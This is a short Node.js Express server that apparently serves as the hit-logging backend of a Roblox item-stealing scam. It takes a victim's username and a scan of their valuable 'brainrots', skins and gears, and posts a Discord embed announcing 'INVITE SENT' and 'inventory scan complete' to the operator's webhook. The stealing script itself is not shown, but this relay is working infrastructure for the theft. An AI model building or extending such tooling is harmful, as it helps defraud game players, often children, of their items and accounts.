require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

app.use((req, res, next) => {
  const authHeader = req.headers.authorization;
  if (process.env.API_KEY && authHeader !== `Bearer ${process.env.API_KEY}`) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  next();
});

app.post('/transform', async (req, res) => {
  try {
    const data = req.body;
    const embed = buildHitEmbed(data);
    await axios.post(process.env.DISCORD_WEBHOOK_URL, { embeds: [embed] });
    res.json({ status: 'ok', message: 'Mensaje enviado a Discord' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Error al procesar' });
  }
});

function buildHitEmbed(data) {
  const scriptName = process.env.SCRIPT_NAME || 'Script';
  const executor = data.executor || 'Desconocido';
  const timestamp = data.timestamp || '';

  // Targeted
  const targetedBrainrots = data.targetedBrainrots || [];
  const baseSkins = data.baseSkins || [];
  const gears = data.gears || [];

  const targetedBrainrotList = targetedBrainrots.map(item => `• ${item.name} — ${item.price}`).join('\n') || 'Ninguno';
  const targetedSkinsList = baseSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
  const targetedGearsList = gears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
  const targetedGearsSkins = [targetedSkinsList, targetedGearsList].filter(Boolean).join('\n') || 'Ninguno';

  // Untargeted
  const untargetedBrainrots = data.untargetedBrainrots || [];
  const untargetedSkins = data.untargetedBaseSkins || [];
  const untargetedGears = data.untargetedGears || [];

  const untargetedBrainrotList = untargetedBrainrots.map(item => `• 🧠 ${item.name} — ${item.price}`).join('\n') || '';
  const untargetedSkinList = untargetedSkins.map(skin => `• 👕 ${skin}`).join('\n') || '';
  const untargetedGearList = untargetedGears.map(gear => `• ⚙️ ${gear}`).join('\n') || '';
  const untargetedAll = [untargetedBrainrotList, untargetedSkinList, untargetedGearList].filter(Boolean).join('\n') || 'Ninguno';

  const totalTargeted = targetedBrainrots.length + baseSkins.length + gears.length;
  const totalUntargeted = untargetedBrainrots.length + untargetedSkins.length + untargetedGears.length;

  return {
    title: `✅ SUCCESS: ${scriptName} INVITE SENT`,
    description: `✨ Invite successfully sent to Username: **${executor}**\nInventory scan complete. Processing items...`,
    color: 0x2ecc71,
    fields: [
      {
        name: `🧠 Targeted Brainrots (${targetedBrainrots.length}):`,
        value: targetedBrainrotList,
        inline: false
      },
      {
        name: `⚙️ Targeted Gears & Base Skins (${baseSkins.length + gears.length}):`,
        value: targetedGearsSkins,
        inline: false
      },
      {
        name: `❌ Untargeted Items (${totalUntargeted}):`,
        value: untargetedAll,
        inline: false
      }
    ],
    footer: {
      text: `${scriptName} | Automated System • ${timestamp}`
    },
    timestamp: new Date().toISOString()
  };
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API escuchando en puerto ${PORT}`));
